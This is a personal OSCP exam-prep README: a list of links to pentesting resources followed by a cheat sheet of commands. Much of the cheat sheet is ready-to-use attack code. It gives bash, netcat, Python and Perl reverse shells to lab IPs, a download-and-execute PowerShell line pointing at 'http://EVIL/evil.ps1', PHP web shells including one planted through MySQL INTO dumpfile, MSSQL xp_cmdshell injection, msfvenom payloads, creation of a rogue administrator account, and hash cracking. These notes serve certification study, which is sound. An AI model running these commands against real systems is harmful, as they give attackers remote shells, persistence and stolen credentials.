# oscp_notes
My Personal OSCP Notes

Welp, just my personal OSCP notes. I am pretty sure these can help you get VERY high score in your exam. So why not try them out?

I am still organizing all my scripts and stuff. Please stay tune to the repo.

## Good Readups
### Common
[Reverse Shell One-liner](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Spawn TTY](https://netsec.ws/?p=337)

[SMB Enum Methods](https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit#gid=2080645025)

[NMap Cheatsheet](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)

[NETSEC MSFVENOM](https://netsec.ws/?p=331)

[ReGeorg HTTP Reverse Proxy](https://github.com/sensepost/reGeorg)

[PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

### Linux
[(Outdated) Basic Linux Priviledge Checklist - https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/](https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/)

[Basic Linux Priviledge Escalation Checklist - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Exploit SUID/SGID - https://null-byte.wonderhowto.com/how-to/hack-like-pro-finding-potential-suid-sgid-vulnerabilities-linux-unix-systems-0158373/](https://null-byte.wonderhowto.com/how-to/hack-like-pro-finding-potential-suid-sgid-vulnerabilities-linux-unix-systems-0158373/)


### Windows
[Windows Exploit Suggester - https://resources.infosecinstitute.com/windows-exploit-suggester-an-easy-way-to-find-and-exploit-windows-vulnerabilities/](https://resources.infosecinstitute.com/windows-exploit-suggester-an-easy-way-to-find-and-exploit-windows-vulnerabilities/)

[PowerSploit - Post-exploit framework - https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

[nishang - Post-exploit Toolkit - https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

[Some Windows privesc techniques - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[LOLBAS](https://lolbas-project.github.io/)

[SMB RPC](https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/)

[Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)

[Mimikatz小实验：黄金票据+dcsync](https://www.freebuf.com/sectool/112594.html)

[Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[Ways to Download and Execute code via the Commandline](https://www.greyhathacker.net/?p=500)

[Windows Privilege Escalation - a cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)

[PowerShell guide](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)

### Database
[SQL Injection Techniques - https://www.exploit-db.com/docs/41273.pdf](https://www.exploit-db.com/docs/41273.pdf)

[Useful notes - https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

### Offsec Information
[OSCP Sample Report](https://www.offensive-security.com/pwk-online/PWKv1-REPORT.doc)
[Offsec MSFVENOM](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
[Offsec Mimikatz](https://www.offensive-security.com/metasploit-unleashed/mimikatz/)
[Offsec Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md)
[PWK Forum](https://forums.offensive-security.com)
[Offensive Security’s Complete Guide to Alpha](https://forums.offensive-security.com/showthread.php?4689-Offensive-Security-s-Complete-Guide-to-Alpha)
[Hash Cracking](https://cracker.offensive-security.com/)

## Command Notes
### Windows Enumeration
    # Process list with user
    tasklist /v
    
    # Get all listening/connected port
    netstat -a
    
    # Get all local users
    net users
    
    # Launch powershell bypass policy
    powershell -ep bypass
    
    # Get all services (Recommend using PowerShell method instead)
    sc query type= service > C:\inetpub\wwwroot\ServicesList.txt
    
### Linux Enumeration
    # Process list with detailed command line
    ps -Afwww
    
    # Get all listening/connected port
    netstat -natlp
    
    # Get all files with SUID bit
    find / -perm /4000
    
### PowerShell
Please have a look PowerSploit and Nishang, both give you powerful features to finish your enum on Windows
    # Import/Load library (either one)
    . .\powersploit.psd1
    Import-Module .\powersploit.psd1
    
    # PowerShell One-liner
    powershell -c <COMMAND>
    
    # Download File (Windows XP/PowerShell 2.0+)
    powershell "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.51:4949/yo.exe','yo.exe')"
    
    # Download File and execute (PowerShell 3.0+)
    # iex = Invoke-Expression (Execution)
    # iwr = Invoke-WebRequest (Download)
    iex (iwr 'http://EVIL/evil.ps1')

    # Jump x86 PowerShell to X64 PowerShell [Out-Of-OSCP-Scope]
    C:\Windows\sysnative\windowspowershell\v1.0\powershell.exe -NonInteractive -NoProfile

    # Get all services and write into file
    Get-WmiObject win32_service | select Name, DisplayName, State, PathName |export-csv C:/inetpub/wwwroot/checks.txt

### NMap
    # Scanning TCP ports 1 - 65535 + verbose + OS detection + timeout settings + treat all host online
    nmap -vv -p- -A -T4 -sV -Pn <IP>
    
    # Find useful NMap Script Engine (NSE) Script [Change $1 to your keyword or save it as script]
    ls -la /usr/share/nmap/scripts/ |grep $1 |awk -F ' ' '{print $NF}'

### Metasploit
    # Shell listener for reverse payload (Server side)
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.45.31
    set LPORT 1337
    set ExitOnSession false
    exploit -j -z

### Shellcodes
    # PHP Meterpreter reverse payload
    msfvenom -p php/meterpreter/bind_tcp LHOST=10.11.0.51 LPORT=1337 -f php > meterp.php
    
    # Find useful payload for msfvenom/metasploit (save it as script)
        #!/bin/bash

        cmd="msfvenom -l payloads "
        for i in "$@"
        do
            cmd=$(echo $cmd && echo "|grep $i ")
        done
        eval $cmd
        
    # Getting list of available format
    msfvenom -l format
    
    # General guide of msfvenom
    msfvenom -f <FORMAT> -p <PAYLOAD> -e <ENCODE_METHOD> -b <BAD_CHAR> -o <OUTPUT_FILE> -a <ARCHITECTURE> [LHOST=<REVERSE_HOST> LPORT=<REVERSE_PORT>]

    # PHP error display (useful for testing shells)
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);

    # PHP Simple Shell
    <?php echo system($_GET['cmd']);?>
    <?php @system($_GET['c'])?>

    # bash reverse shell
    bash -i >& /dev/tcp/10.11.0.51/1337 0>&1

    # netcat (nc) reverse shell (simple)
    /bin/sh | nc <your IP> <port>

    # netcat (nc) evil reverse shell (require specific evil version)
    nc -e /bin/bash <your IP> <port>

    # Python reverse shell
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.38.31”,1339));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

    # Perl reverse shell
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.11.1.246:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

    # Python shell construction (useful for TOO simple shell)
    python -c 'import pty;pty.spawn("/bin/bash")'

    # MSSQL No DUMP shell
    DECLARE @c varchar(3000);set @c=0x70696e6731302e31312e302e3531;EXEC master..xp_cmdshell @c--

    # MSSQL DUMP shell
    DECLARE @cVARCHAR(8000);SET @c=0x64697220433a5c;INSERT INTO sqlmapoutput(data) EXEC master…xp_cmdshell @c–

### Payload hosting method

    # Python
    python -m SimpleHTTPServer 8080

### MySQL Techniques
    # Load local file
    LOAD DATA LOCAL INFILE “/etc/passwd” INTO TABLE yolo

    # Clear and Load local file
    TRUNCATE yolo;LOAD DATA LOCAL INFILE “/etc/phpmyadmin/apache.conf” INTO TABLE yolo;

    # Basic into dumpfile
    select “<?php echo system($_GET['cmd']);?>” INTO dumpfile ‘/var/www/html/yolo.php’


### Random Knowledge

    # Mount file system
    mount -t cifs -o user=bob,sec=ntlm,dir_mode=0077 “//10.11.1.136/Bob Share” /mnt/cifs

    # John The Ripper
    unshadow 10.11.1.141_passwd 10.11.1.141_shadow >10.11.1.141_tocrack
    john --word=/usr/share/wordlists/rockyou.txt 10.11.1.141_tocrack --fork=30

    # Windows add new administrator account
    net user yolo whysoserious /add
    net localgroup Administrators yolo /add

    # Find broken UID files
    find / -user root -perm -4000 -exec ls -ldb {} ; > /tmp/uids

    # GCC cross compile
    gcc -m32 -Wl,–hash-style=both -o exploit exploit.c

    # SSH Local Bind Tunnel (Bind 1337 on client (local))
    ssh -L 127.0.0.1:1337:localhost:443 root@victim

    # SSH Remote Bind Tunnel (Bind 1337 on target (remote)) [Useful for tunneling into another network]
    ssh -R 127.0.0.1:1337:10.30.0.3:443 root@victim

    # SSH Dynamic Tunnel (Useful for VPN usage)
    ssh -D9999 root@victim
